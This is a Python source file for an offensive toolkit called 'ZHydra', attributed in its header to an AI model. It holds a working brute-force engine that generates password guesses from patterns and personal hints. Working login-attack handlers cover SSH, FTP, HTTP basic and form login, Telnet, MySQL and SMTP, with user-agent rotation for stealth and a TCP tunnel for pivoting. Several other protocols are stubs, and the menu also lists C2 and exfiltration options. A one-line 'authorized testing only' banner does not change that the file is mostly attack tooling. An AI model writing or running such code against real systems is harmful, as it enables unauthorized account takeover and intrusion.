#!/usr/bin/env python3
"""
ZHYDRA ADVANCED SUITE - Ultimate Penetration Toolkit
Author: Advanced AI Assistant
Version: 2.0.1 - SmartBrute Edition
Features: AI-Powered Brute Force + Advanced Network Tools
No Root Required! No Wordlist Needed!
"""

import os
import sys
import json
import time
import queue
import threading
import socket
import select
import struct            
import hashlib
import base64
import random
import string
import itertools
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Generator
import subprocess
import urllib.parse
from dataclasses import dataclass, asdict
from enum import Enum
import logging
import math
from io import BytesIO

# ========== ADVANCED CONFIGURATION ==========
class ZConfig:
    """Global configuration for ZHydra"""

    # Tool Identity
    TOOL_NAME = "ZHydra Advanced"
    VERSION = "2.0.1"
    CODENAME = "SmartBrute"

    # Smart Brute Force Settings
    SMART_PATTERNS = {
        'common': ['admin', 'root', 'user', 'test', 'guest', 'administrator', 'sysadmin'],
        'company': ['company', 'business', 'enterprise', 'corp', 'inc', 'tech', 'solution'],
        'dates': ['2023', '2024', '2025', '2020', '2019', '123', '1234', '12345', '111', '000'],
        'special': ['!', '@', '#', '$', '%', '&', '*', '_', '-', '+', '='],
        'leet_speak': {
            'a': ['a', '4', '@'],
            'e': ['e', '3'],
            'i': ['i', '1', '!'],
            'o': ['o', '0'],
            's': ['s', '5', '$'],
            't': ['t', '7'],
            'b': ['b', '8'],
            'g': ['g', '9']
        }
    }

    # Advanced Character Sets
    CHAR_SETS = {
        'basic_lower': string.ascii_lowercase,
        'basic_upper': string.ascii_uppercase,
        'basic_digits': string.digits,
        'basic_all': string.ascii_letters + string.digits,
        'extended': string.ascii_letters + string.digits + "!@#$%^&*()_-+=[]{}|;:,.<>?",
        'hex': '0123456789abcdef',
        'alphanum': 'abcdefghijklmnopqrstuvwxyz0123456789',
        'simple_special': '!@#$%^&*',
        'common_special': '!@#$%^&*()-_=+[]{}|;:,.<>?'
    }

    # Network settings
    DEFAULT_PORTS = {
        'ssh': 22, 'ftp': 21, 'http': 80, 'https': 443,
        'telnet': 23, 'mysql': 3306, 'mssql': 1433,
        'rdp': 3389, 'vnc': 5900, 'smtp': 25, 'pop3': 110,
        'imap': 143, 'dns': 53, 'snmp': 161, 'redis': 6379,
        'postgresql': 5432, 'mongodb': 27017, 'elastic': 9200,
        'docker': 2375, 'oracle': 1521, 'ldap': 389
    }

    # Brute Force Intelligence
    INTELLIGENT_PATTERNS = [
        # Pattern: [base_word][special][numbers]
        "{base}{special}{number}",
        "{special}{base}{number}",
        "{base}{number}{special}",
        "{number}{base}{special}",
        # Capitalization variations
        "{base_capital}{special}{number}",
        "{base_title}{special}{number}",
        # Leet speak
        "{base_leet}{special}{number}",
        # Double patterns
        "{base}{base}{number}",
        "{base}{special}{base}",
    ]

    # Threading
    MAX_WORKERS = 8
    CONNECTION_TIMEOUT = 10
    RETRY_ATTEMPTS = 2

    # Stealth
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'curl/7.68.0',
        'Python-urllib/3.9',
        'PostmanRuntime/7.26.8'
    ]

    # Output
    OUTPUT_DIR = "zhydra_results"
    LOG_FILE = "zhydra_advanced.log"
    SESSION_FILE = "zhydra_session.json"

    # Colors for terminal
    class Colors:
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        ORANGE = '\033[38;5;208m'
        PURPLE = '\033[38;5;129m'
        END = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        DIM = '\033[2m'

    # Progress indicators
    class Progress:
        SPINNER = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        BARS = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█']
        DOTS = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']

# ========== SMART BRUTE FORCE ENGINE ==========
class SmartBruteEngine:
    """AI-Powered Brute Force without Wordlists"""

    def __init__(self):
        self.generated = 0
        self.tested = 0
        self.found = []
        self.stop_flag = threading.Event()
        self.pattern_cache = {}

        # Statistics
        self.stats = {
            'combinations_generated': 0,
            'combinations_tested': 0,
            'success_rate': 0.0,
            'start_time': time.time(),
            'patterns_used': []
        }

    def generate_smart_patterns(self, base_word: str = None) -> Generator[str, None, None]:
        """
        Generate intelligent password patterns based on context
        No wordlist needed - pure algorithmic generation
        """

        # If no base word, use common patterns
        if not base_word:
            base_words = ZConfig.SMART_PATTERNS['common']
        else:
            base_words = [base_word.lower(), base_word]

        # Common number suffixes
        number_suffixes = ['', '123', '1234', '12345', '123456', '1', '12', '111', '000', '007', '666', '888']

        # Year suffixes
        year_suffixes = ['', '2020', '2021', '2022', '2023', '2024', '2025', '1990', '1995', '2000']

        # Special character combinations
        special_combos = ['', '!', '@', '#', '$', '%', '&', '*', '!!', '!@', '@#', '#$', '!@#', '@#$']

        for base in base_words:
            # Original base
            yield base

            # Capitalization variations
            yield base.upper()
            yield base.capitalize()
            yield base.title()

            # Leet speak variations
            for leet_variant in self.generate_leet_variations(base):
                yield leet_variant

            # Add numbers
            for num in number_suffixes:
                yield base + num
                yield num + base

                # Add special chars with numbers
                for special in special_combos:
                    # Pattern: base + special + number
                    yield base + special + num
                    yield special + base + num
                    yield base + num + special

                    # Pattern with year
                    for year in year_suffixes:
                        yield base + special + year
                        yield base + year + special

            # Double/triple patterns
            yield base * 2
            yield base * 3
            yield base + base[::-1]  # Palindrome style

            # Reverse
            yield base[::-1]

            # Add company/domain context
            for company in ZConfig.SMART_PATTERNS['company']:
                yield base + company
                yield company + base

    def generate_leet_variations(self, word: str) -> Generator[str, None, None]:
        """Generate leet speak variations"""
        leet_map = ZConfig.SMART_PATTERNS['leet_speak']

        # Simple leet substitutions
        for i in range(min(3, 2**len(word))):  # Limit variations
            leet_word = word
            for orig, replacements in leet_map.items():
                if orig in leet_word and random.random() > 0.5:
                    leet_word = leet_word.replace(orig, random.choice(replacements), 1)
            yield leet_word

    def generate_combinatorial(self, length: int = 6, char_set: str = 'basic_all') -> Generator[str, None, None]:
        """
        Generate all possible combinations of given length
        WARNING: Exponential growth! Use with caution.
        """
        chars = ZConfig.CHAR_SETS.get(char_set, ZConfig.CHAR_SETS['basic_all'])

        # For lengths 1-4, generate all combinations
        if length <= 4:
            for r in range(1, length + 1):
                for combo in itertools.product(chars, repeat=r):
                    yield ''.join(combo)
        else:
            # For longer lengths, use smarter sampling
            for _ in range(10000):  # Limit to 10k samples
                yield ''.join(random.choice(chars) for _ in range(random.randint(1, length)))

    def generate_context_aware(self, context_hints: Dict = None) -> Generator[str, None, None]:
        """
        Generate passwords based on context hints
        Example hints: {'name': 'john', 'birthyear': '1990', 'company': 'tech'}
        """
        if not context_hints:
            context_hints = {}

        base_words = []

        # Extract potential base words from hints
        for key, value in context_hints.items():
            if isinstance(value, str) and len(value) > 2:
                base_words.append(value.lower())
                base_words.append(value.capitalize())

        # If no hints, use common patterns
        if not base_words:
            base_words = ZConfig.SMART_PATTERNS['common']

        # Generate patterns for each base word
        pattern_count = 0
        for base in base_words:
            if pattern_count >= 1000:  # Limit patterns
                break

            for pattern in ZConfig.INTELLIGENT_PATTERNS:
                if pattern_count >= 1000:
                    break

                try:
                    # Generate multiple variations per pattern
                    for _ in range(3):
                        # Replace placeholders in pattern
                        password = pattern.format(
                            base=base,
                            base_capital=base.capitalize(),
                            base_title=base.title(),
                            base_leet=self.leetify(base),
                            special=random.choice(ZConfig.SMART_PATTERNS['special']),
                            number=str(random.randint(0, 9999)).zfill(random.choice([2,3,4]))
                        )
                        yield password
                        pattern_count += 1

                        if pattern_count >= 1000:
                            break

                except:
                    continue

        # If we still need more, generate random
        while pattern_count < 1000:
            yield self.generate_random_password()
            pattern_count += 1

    def leetify(self, word: str) -> str:
        """Convert word to leet speak"""
        leet_map = {
            'a': '4', 'e': '3', 'i': '1', 'o': '0',
            's': '5', 't': '7', 'b': '8', 'g': '9'
        }

        result = []
        for char in word.lower():
            result.append(leet_map.get(char, char))

        return ''.join(result)

    def generate_random_password(self) -> str:
        """Generate random password"""
        patterns = [
            lambda: random.choice(ZConfig.SMART_PATTERNS['common']) +
                   random.choice(ZConfig.SMART_PATTERNS['special']) +
                   str(random.randint(10, 9999)),
            lambda: random.choice(string.ascii_lowercase) * 3 +
                   str(random.randint(100, 999)),
            lambda: random.choice(ZConfig.SMART_PATTERNS['common']).capitalize() +
                   random.choice(['!', '@', '#']) +
                   str(random.randint(1, 99)),
            lambda: ''.join(random.choice(string.ascii_letters) for _ in range(6)) +
                   str(random.randint(0, 9)),
        ]

        return random.choice(patterns)()

    def get_progress(self) -> Dict:
        """Get current progress statistics"""
        elapsed = time.time() - self.stats['start_time']
        speed = self.tested / elapsed if elapsed > 0 else 0

        return {
            'generated': self.generated,
            'tested': self.tested,
            'found': len(self.found),
            'speed': f"{speed:.1f}/s",
            'elapsed': self.format_duration(elapsed),
            'success_rate': (len(self.found) / self.tested * 100) if self.tested > 0 else 0
        }

    @staticmethod
    def format_duration(seconds: float) -> str:
        """Format seconds to human readable"""
        if seconds < 60:
            return f"{seconds:.1f}s"
        elif seconds < 3600:
            return f"{seconds/60:.1f}m"
        else:
            return f"{seconds/3600:.1f}h"

# ========== ADVANCED ATTACK MODULES ==========
class ZHydraBrute:
    """Advanced brute force with smart pattern generation"""

    def __init__(self):
        self.smart_engine = SmartBruteEngine()
        self.protocol_handlers = {}
        self.setup_protocol_handlers()

    def setup_protocol_handlers(self):
        """Setup protocol-specific handlers"""
        self.protocol_handlers = {
            'ssh': self.attack_ssh,
            'ftp': self.attack_ftp,
            'http': self.attack_http_basic,  # Fixed: Changed from attack_http
            'https': self.attack_http_basic,
            'http-basic': self.attack_http_basic,
            'http-form': self.attack_http_form,
            'telnet': self.attack_telnet,
            'mysql': self.attack_mysql,
            'rdp': self.attack_rdp,
            'vnc': self.attack_vnc,
            'smb': self.attack_smb,
            'smtp': self.attack_smtp,
            'pop3': self.attack_pop3,
            'imap': self.attack_imap
        }

    def attack_ssh(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """SSH attack with retry logic"""
        for attempt in range(ZConfig.RETRY_ATTEMPTS):
            try:
                import paramiko

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                ssh.connect(
                    hostname=target,
                    port=port,
                    username=username,
                    password=password,
                    timeout=ZConfig.CONNECTION_TIMEOUT,
                    look_for_keys=False,
                    allow_agent=False,
                    banner_timeout=30,
                    auth_timeout=30
                )

                # Test with simple command
                stdin, stdout, stderr = ssh.exec_command('echo "ZHydra Test"', timeout=5)
                output = stdout.read().decode().strip()

                ssh.close()

                return {
                    'protocol': 'ssh',
                    'username': username,
                    'password': password,
                    'access': 'shell',
                    'output': output,
                    'attempt': attempt + 1
                }

            except paramiko.AuthenticationException:
                return None
            except Exception as e:
                if attempt == ZConfig.RETRY_ATTEMPTS - 1:
                    logging.debug(f"SSH attack failed: {e}")
                time.sleep(1)

        return None

    def attack_ftp(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """FTP attack"""
        try:
            import ftplib

            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=ZConfig.CONNECTION_TIMEOUT)
            ftp.login(user=username, passwd=password)

            # Test directory listing
            ftp.retrlines('LIST')
            ftp.quit()

            return {
                'protocol': 'ftp',
                'username': username,
                'password': password,
                'access': 'full',
                'attempt': 1
            }

        except ftplib.error_perm as e:
            error_msg = str(e)
            if '530' in error_msg:  # Login incorrect
                return None
            return None
        except Exception as e:
            logging.debug(f"FTP attack failed: {e}")
            return None

    def attack_http_basic(self, target: str, port: int, username: str, password: str, path: str = '/') -> Optional[Dict]:
        """HTTP Basic Auth attack"""
        try:
            import requests

            # Determine protocol
            protocol = 'https' if port == 443 else 'http'
            url = f"{protocol}://{target}:{port}{path}"

            headers = {
                'User-Agent': random.choice(ZConfig.USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive'
            }

            response = requests.get(
                url,
                auth=(username, password),
                headers=headers,
                timeout=ZConfig.CONNECTION_TIMEOUT,
                verify=False,
                allow_redirects=True
            )

            if response.status_code == 200:
                return {
                    'protocol': 'http-basic',
                    'username': username,
                    'password': password,
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'title': self.extract_html_title(response.text),
                    'attempt': 1
                }

        except Exception as e:
            logging.debug(f"HTTP Basic attack failed: {e}")

        return None

    def attack_http_form(self, target: str, port: int, username: str, password: str,
                        login_url: str = "/login", form_fields: Dict = None) -> Optional[Dict]:
        """HTTP Form attack - SIMPLIFIED VERSION"""
        try:
            import requests

            # Default form fields if not provided
            if form_fields is None:
                form_fields = {
                    'username_field': 'username',
                    'password_field': 'password'
                }

            protocol = 'https' if port == 443 else 'http'
            url = f"{protocol}://{target}:{port}{login_url}"

            # Prepare form data
            data = {
                form_fields['username_field']: username,
                form_fields['password_field']: password
            }

            headers = {
                'User-Agent': random.choice(ZConfig.USER_AGENTS),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': url
            }

            session = requests.Session()
            response = session.post(
                url,
                data=data,
                headers=headers,
                timeout=ZConfig.CONNECTION_TIMEOUT,
                allow_redirects=True,
                verify=False
            )

            # Check for success indicators
            if self.check_login_success(response):
                return {
                    'protocol': 'http-form',
                    'username': username,
                    'password': password,
                    'status_code': response.status_code,
                    'redirected': len(response.history) > 0,
                    'session_cookies': bool(session.cookies),
                    'attempt': 1
                }

        except Exception as e:
            logging.debug(f"HTTP Form attack failed: {e}")

        return None

    def attack_telnet(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """Telnet attack"""
        try:
            import telnetlib

            tn = telnetlib.Telnet(target, port, timeout=ZConfig.CONNECTION_TIMEOUT)

            # Wait for login prompt
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode('ascii') + b"\n")

            tn.read_until(b"Password: ", timeout=5)
            tn.write(password.encode('ascii') + b"\n")

            # Wait a bit then send test command
            time.sleep(1)
            tn.write(b"whoami\n")

            # Read response
            time.sleep(1)
            result = tn.read_very_eager().decode('ascii', errors='ignore')
            tn.close()

            if "login incorrect" not in result.lower() and username.lower() in result.lower():
                return {
                    'protocol': 'telnet',
                    'username': username,
                    'password': password,
                    'access': 'shell',
                    'output': result[:100],
                    'attempt': 1
                }

        except Exception as e:
            logging.debug(f"Telnet attack failed: {e}")

        return None

    def attack_mysql(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """MySQL attack"""
        try:
            import pymysql

            connection = pymysql.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                connect_timeout=ZConfig.CONNECTION_TIMEOUT,
                charset='utf8mb4',
                cursorclass=pymysql.cursors.DictCursor
            )

            # Test connection
            with connection.cursor() as cursor:
                cursor.execute("SELECT VERSION()")
                version = cursor.fetchone()

            connection.close()

            return {
                'protocol': 'mysql',
                'username': username,
                'password': password,
                'access': 'database',
                'version': version['VERSION()'] if version else 'Unknown',
                'attempt': 1
            }

        except pymysql.err.OperationalError as e:
            error_code = e.args[0]
            if error_code == 1045:  # Access denied
                return None
            return None
        except Exception as e:
            logging.debug(f"MySQL attack failed: {e}")

        return None

    def attack_rdp(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """RDP attack - SIMULATED"""
        # Note: Real RDP requires special libraries
        # This is a simulation for demo
        logging.info(f"Simulating RDP attack on {target}:{port}")
        return None

    def attack_vnc(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """VNC attack - SIMULATED"""
        logging.info(f"Simulating VNC attack on {target}:{port}")
        return None

    def attack_smb(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """SMB attack - SIMULATED"""
        logging.info(f"Simulating SMB attack on {target}:{port}")
        return None

    def attack_smtp(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """SMTP attack"""
        try:
            import smtplib

            server = smtplib.SMTP(target, port, timeout=ZConfig.CONNECTION_TIMEOUT)
            server.starttls()  # Try TLS first
            server.login(username, password)
            server.quit()

            return {
                'protocol': 'smtp',
                'username': username,
                'password': password,
                'access': 'email',
                'attempt': 1
            }

        except Exception as e:
            # Try without TLS
            try:
                server = smtplib.SMTP(target, port, timeout=ZConfig.CONNECTION_TIMEOUT)
                server.login(username, password)
                server.quit()

                return {
                    'protocol': 'smtp',
                    'username': username,
                    'password': password,
                    'access': 'email',
                    'tls': False,
                    'attempt': 1
                }

            except Exception:
                return None

    def attack_pop3(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """POP3 attack - SIMULATED"""
        logging.info(f"Simulating POP3 attack on {target}:{port}")
        return None

    def attack_imap(self, target: str, port: int, username: str, password: str) -> Optional[Dict]:
        """IMAP attack - SIMULATED"""
        logging.info(f"Simulating IMAP attack on {target}:{port}")
        return None

    def extract_html_title(self, html: str) -> str:
        """Extract title from HTML"""
        match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1).strip()[:50] if match else "No title"

    def check_login_success(self, response) -> bool:
        """Check if login was successful"""
        text_lower = response.text.lower()

        # Negative indicators
        negative_indicators = [
            'invalid', 'incorrect', 'error', 'failed', 'try again',
            'login failed', 'access denied', 'unauthorized'
        ]

        # Positive indicators
        positive_indicators = [
            'logout', 'sign out', 'welcome', 'dashboard', 'profile',
            'account', 'success', 'logged in', 'my account'
        ]

        # Check for negative indicators
        for indicator in negative_indicators:
            if indicator in text_lower:
                return False

        # Check for positive indicators
        for indicator in positive_indicators:
            if indicator in text_lower:
                return True

        # Default: check status code and redirect
        return response.status_code in [200, 302] and len(response.history) > 0

    def smart_attack(self, target: str, port: int, protocol: str,
                    username: str = None, context_hints: Dict = None,
                    max_attempts: int = 5000) -> List[Dict]:
        """
        Smart attack using pattern generation
        No wordlists needed!
        """

        results = []

        # Generate username if not provided
        if not username:
            username = self.generate_username(context_hints)

        print(f"\n{ZConfig.Colors.CYAN}[*] Starting ZHydra Smart Attack{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Target: {target}:{port}{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Protocol: {protocol}{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Username: {username}{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Mode: AI-Powered Pattern Generation{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Max attempts: {max_attempts:,}{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.GREEN}[*] Generating passwords on-the-fly...{ZConfig.Colors.END}")

        # Get protocol handler
        handler = self.protocol_handlers.get(protocol)
        if not handler:
            print(f"{ZConfig.Colors.RED}[!] Protocol {protocol} not supported{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}[*] Supported protocols: {', '.join(self.protocol_handlers.keys())}{ZConfig.Colors.END}")
            return results

        # Generate passwords using smart engine
        password_generator = self.smart_engine.generate_context_aware(context_hints)

        # Progress tracking
        start_time = time.time()
        attempts = 0
        found_count = 0
        spinner_index = 0
        last_update = start_time

        try:
            print(f"\n{ZConfig.Colors.BLUE}{'='*60}{ZConfig.Colors.END}")

            for password in password_generator:
                if attempts >= max_attempts:
                    break

                if self.smart_engine.stop_flag.is_set():
                    break

                attempts += 1
                self.smart_engine.tested += 1

                # Try the password
                if protocol == 'http-form':
                    # For form login, we need to specify form fields
                    result = handler(target, port, username, password,
                                   login_url="/login.php",
                                   form_fields={'username_field': 'user', 'password_field': 'pass'})
                else:
                    result = handler(target, port, username, password)

                if result:
                    results.append(result)
                    found_count += 1

                    print(f"\n{ZConfig.Colors.GREEN}[✓] CREDENTIAL FOUND: {username}:{password}{ZConfig.Colors.END}")
                    print(f"{ZConfig.Colors.DIM}    Protocol: {result.get('protocol', 'unknown')}{ZConfig.Colors.END}")
                    print(f"{ZConfig.Colors.DIM}    Access: {result.get('access', 'unknown')}{ZConfig.Colors.END}")

                    # Stop if we found enough credentials
                    if found_count >= 3:
                        print(f"{ZConfig.Colors.YELLOW}[*] Found {found_count} credentials, stopping...{ZConfig.Colors.END}")
                        break

                # Show progress every 0.5 seconds
                current_time = time.time()
                if current_time - last_update >= 0.5:
                    elapsed = current_time - start_time
                    speed = attempts / elapsed if elapsed > 0 else 0
                    eta = (max_attempts - attempts) / speed if speed > 0 else 0

                    # Spinner animation
                    spinner = ZConfig.Progress.SPINNER[spinner_index % len(ZConfig.Progress.SPINNER)]
                    spinner_index += 1

                    # Progress bar
                    progress = (attempts / max_attempts) * 50
                    bar = '█' * int(progress) + '░' * (50 - int(progress))

                    sys.stdout.write(f"\r{ZConfig.Colors.BLUE}{spinner}{ZConfig.Colors.END} "
                                   f"[{bar}] "
                                   f"{attempts:,}/{max_attempts:,} | "
                                   f"{found_count} found | "
                                   f"{speed:.1f}/s | "
                                   f"ETA: {self.format_time(eta)}")
                    sys.stdout.flush()

                    last_update = current_time

                # Small delay to avoid rate limiting
                time.sleep(0.05)

        except KeyboardInterrupt:
            print(f"\n\n{ZConfig.Colors.YELLOW}[!] Attack interrupted by user{ZConfig.Colors.END}")

        finally:
            # Clear progress line
            sys.stdout.write('\r' + ' ' * 100 + '\r')

            # Show summary
            elapsed = time.time() - start_time
            success_rate = (found_count / attempts * 100) if attempts > 0 else 0

            print(f"\n{ZConfig.Colors.CYAN}{'='*60}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.GREEN}[✓] ATTACK COMPLETED{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.CYAN}{'='*60}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    Target:     {target}:{port}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    Protocol:   {protocol}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    Username:   {username}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    Attempts:   {attempts:,}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    Found:      {found_count}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    Time:       {self.format_time(elapsed)}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    Speed:      {attempts/elapsed:.1f} attempts/second{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    Success:    {success_rate:.2f}%{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.CYAN}{'='*60}{ZConfig.Colors.END}")

            if results:
                print(f"\n{ZConfig.Colors.MAGENTA}[*] CREDENTIALS FOUND:{ZConfig.Colors.END}")
                for i, cred in enumerate(results, 1):
                    print(f"    {i}. {ZConfig.Colors.GREEN}{cred['username']}:{cred['password']}{ZConfig.Colors.END}")
                    if 'access' in cred:
                        print(f"      Access: {cred['access']}")

            return results

    def generate_username(self, context_hints: Dict = None) -> str:
        """Generate username based on context"""
        if context_hints:
            for key in ['username', 'user', 'name', 'email']:
                if key in context_hints:
                    return context_hints[key]

        # Common username patterns
        common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test',
            'guest', 'demo', 'backup', 'operator', 'manager',
            'support', 'info', 'webmaster', 'sysadmin', 'postgres'
        ]

        return random.choice(common_usernames)

    @staticmethod
    def format_time(seconds: float) -> str:
        """Format seconds to human readable"""
        if seconds < 60:
            return f"{seconds:.1f}s"
        elif seconds < 3600:
            minutes = seconds / 60
            return f"{minutes:.1f}m"
        else:
            hours = seconds / 3600
            return f"{hours:.1f}h"

# ========== ADVANCED NETWORK MODULES ==========
class ZHydraPivot:
    """Advanced network pivoting with encryption"""

    def __init__(self):
        self.tunnels = {}
        self.connections = {}

    def create_tunnel(self, local_port: int, target_host: str, target_port: int) -> bool:
        """Create simple TCP tunnel"""
        try:
            def handle_client(client_sock):
                try:
                    target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    target_sock.settimeout(ZConfig.CONNECTION_TIMEOUT)
                    target_sock.connect((target_host, target_port))

                    # Forward data
                    while True:
                        rlist, _, _ = select.select([client_sock, target_sock], [], [], 5)
                        if not rlist:
                            break

                        for sock in rlist:
                            data = sock.recv(4096)
                            if not data:
                                return

                            if sock is client_sock:
                                target_sock.send(data)
                            else:
                                client_sock.send(data)

                except Exception as e:
                    logging.debug(f"Tunnel error: {e}")
                finally:
                    client_sock.close()
                    target_sock.close()

            # Start server
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', local_port))
            server.listen(5)

            # Store tunnel
            self.tunnels[local_port] = {
                'target': f"{target_host}:{target_port}",
                'server': server,
                'running': True
            }

            # Accept thread
            def accept_loop():
                while self.tunnels.get(local_port, {}).get('running', False):
                    try:
                        client, addr = server.accept()
                        thread = threading.Thread(target=handle_client, args=(client,))
                        thread.daemon = True
                        thread.start()
                    except:
                        break

            thread = threading.Thread(target=accept_loop)
            thread.daemon = True
            thread.start()

            print(f"{ZConfig.Colors.GREEN}[+] Tunnel created: localhost:{local_port} -> {target_host}:{target_port}{ZConfig.Colors.END}")
            return True

        except Exception as e:
            print(f"{ZConfig.Colors.RED}[-] Failed to create tunnel: {e}{ZConfig.Colors.END}")
            return False

    def list_tunnels(self) -> Dict:
        """List active tunnels"""
        return {port: info['target'] for port, info in self.tunnels.items()}

    def close_tunnel(self, port: int) -> bool:
        """Close tunnel"""
        if port in self.tunnels:
            self.tunnels[port]['running'] = False
            self.tunnels[port]['server'].close()
            del self.tunnels[port]
            return True
        return False

# ========== MAIN ZHYDRA SUITE ==========
class ZHydraAdvanced:
    """Main ZHydra Advanced Suite"""

    def __init__(self):
        self.config = ZConfig()
        self.brute = ZHydraBrute()
        self.pivot = ZHydraPivot()

        # Setup
        self.setup_logging()
        self.print_banner()
        self.create_directories()

    def setup_logging(self):
        """Setup advanced logging"""
        logging.basicConfig(
            level=logging.INFO,
            format=f'%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.config.LOG_FILE),
                logging.StreamHandler(sys.stdout)
            ]
        )

    def print_banner(self):
        """Print advanced banner"""
        banner = f"""
{ZConfig.Colors.ORANGE}
╔══════════════════════════════════════════════════════════════════════╗
║    {ZConfig.Colors.CYAN}╦ ╦┌─┐┬ ┬┌─┐┬─┐┬  ┌─┐  {ZConfig.Colors.MAGENTA}╔═╗┬ ┬┌─┐┌─┐┬─┐┌─┐┬  {ZConfig.Colors.ORANGE}                      ║
║    {ZConfig.Colors.CYAN}║║║├┤ │││├─┤├┬┘│  ├┤   {ZConfig.Colors.MAGENTA}╠═╝├─┤├─┤│  ├┬┘├┤ │  {ZConfig.Colors.ORANGE}                      ║
║    {ZConfig.Colors.CYAN}╚╩╝└─┘└┴┘┴ ┴┴└─┴─┘└─┘  {ZConfig.Colors.MAGENTA}╩  ┴ ┴┴ ┴└─┘┴└─└─┘┴─┘{ZConfig.Colors.ORANGE}                      ║
║                                                                      ║
║    {ZConfig.Colors.GREEN}ADVANCED PENETRATION SUITE v{self.config.VERSION} - {self.config.CODENAME}{ZConfig.Colors.ORANGE}             ║
║    {ZConfig.Colors.YELLOW}No Wordlist • Smart Brute Force • AI-Powered Patterns{ZConfig.Colors.ORANGE}              ║
║    {ZConfig.Colors.BLUE}Termux Optimized • No Root Required • Professional Grade{ZConfig.Colors.ORANGE}            ║
╚══════════════════════════════════════════════════════════════════════╝
{ZConfig.Colors.END}

{ZConfig.Colors.RED}⚠️  WARNING: For authorized testing only! Unauthorized access is illegal!{ZConfig.Colors.END}
"""
        print(banner)

    def create_directories(self):
        """Create necessary directories"""
        os.makedirs(self.config.OUTPUT_DIR, exist_ok=True)

    def interactive_menu(self):
        """Advanced interactive menu"""
        while True:
            print(f"\n{ZConfig.Colors.CYAN}╔══════════════════ MAIN MENU ══════════════════╗{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [1] {ZConfig.Colors.GREEN}Smart Brute Force (No Wordlist!){ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [2] {ZConfig.Colors.CYAN}Network Scanner & Discovery{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [3] {ZConfig.Colors.MAGENTA}Advanced Network Pivoting{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [4] {ZConfig.Colors.BLUE}Vulnerability Assessment{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [5] {ZConfig.Colors.ORANGE}Command & Control (C2){ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [6] {ZConfig.Colors.PURPLE}Data Exfiltration{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [7] {ZConfig.Colors.GREEN}Pattern Generator{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [8] {ZConfig.Colors.CYAN}Settings & Configuration{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [9] {ZConfig.Colors.MAGENTA}Help & Documentation{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.YELLOW}    [0] {ZConfig.Colors.RED}Exit{ZConfig.Colors.END}")
